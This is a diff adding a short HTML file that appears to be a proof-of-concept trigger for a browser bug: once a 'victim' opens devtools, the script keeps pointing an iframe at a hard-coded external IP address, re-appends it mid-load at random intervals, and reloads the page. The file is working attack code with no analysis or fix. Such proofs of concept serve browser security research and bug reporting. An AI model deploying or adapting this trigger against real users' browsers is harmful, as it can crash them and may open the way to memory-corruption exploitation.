@@ -1,0 +1,81 @@
+
+Open devtools to trigger (press F12 on windows) then wait a bit.
+
+
+<script>
+
+
+//This function is useful if the internet connection of the victim is too slow
+function sleep(delay) {
+        var start = new Date().getTime();
+        while (new Date().getTime() < start + delay);
+      }
+
+
+ 
+//This function reappend an iframe during cross origin URL load
+
+function append_iframe_during_load(){
+
+
+
+//Load any cross origin URL
+i.src="http://176.31.255.221/sssssssss";
+
+
+
+//This sleep is useful when the internet connection of the victim is slow
+var t1=Math.floor(Math.random() * 30) + 0;
+sleep(t1);
+
+
+
+
+var c=Math.floor(Math.random() * 5) + 1;
+
+
+
+if(c==1){
+
+document.getElementById('div1').appendChild(i);
+
+console.log(1);
+}
+
+
+
+
+
+//Recurse
+var t=Math.floor(Math.random() * 10) + 1;
+setTimeout(function(){append_iframe_during_load();},t);
+
+}
+
+
+ 
+ 
+ 
+
+
+//Init
+
+var i=document.documentElement.appendChild(document.createElement('iframe'));
+ 
+
+var t=Math.floor(Math.random() * 1000) + 100;
+setTimeout(function(){append_iframe_during_load();},t);
+
+
+
+
+//Reload
+setTimeout(function(){location.reload();},2000);
+
+
+
+
+</script>
+
+
+<div id="div1"></div>
